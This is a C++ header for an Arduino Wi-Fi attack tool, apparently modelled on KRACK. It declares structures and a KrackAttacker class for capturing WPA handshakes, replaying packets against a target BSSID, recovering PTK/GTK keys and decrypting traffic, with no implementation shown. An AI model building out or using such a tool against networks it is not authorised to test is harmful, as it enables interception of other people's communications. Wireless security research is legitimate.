#ifndef KRACK_ADVANCED_H
#define KRACK_ADVANCED_H

#include <Arduino.h>
#include <vector>
#include <map>

namespace KrackAdvanced {

enum KrackPhase {
  HANDSHAKE_CAPTURE,
  PACKET_REPLAY,
  KEY_RECOVERY,
  DECRYPTION
};

struct WpaKey {
  uint8_t ptk[48];
  uint8_t gtk[32];
  uint8_t keyCounter;
  bool isValid;
};

struct KrackConfig {
  char targetBssid[18];
  uint8_t targetChannel;
  KrackPhase phase;
  uint32_t durationMs;
  bool aggressiveReplay;
  uint32_t replayCount;
};

struct KrackResult {
  bool success;
  WpaKey recoveredKey;
  uint32_t packetsReplayed;
  uint32_t packetsDecrypted;
  uint32_t elapsedMs;
  String logFile;
  String error;
};

class KrackAttacker {
public:
  KrackAttacker();
  KrackResult captureHandshake(const KrackConfig& config);
  KrackResult replayPackets(const KrackConfig& config);
  KrackResult recoverKey(const KrackConfig& config);
  WpaKey deriveKeys(const uint8_t* pmk, const uint8_t* nonce);
  String decryptPacket(const uint8_t* encData, uint32_t len, const WpaKey& key);
  void stop();
  bool isRunning() const { return isRunning_; }

private:
  bool isRunning_;
  std::vector<uint8_t> handshakeData_;
  std::map<String, WpaKey> recoveredKeys_;
  unsigned long startTime_;

  void logHandshake(const uint8_t* data, uint32_t len);
  uint8_t* extractNonce(const uint8_t* frame);
  bool validateHandshake(const uint8_t* frame1, const uint8_t* frame2);
  void performKeyRecovery();
};

} // namespace KrackAdvanced

#endif
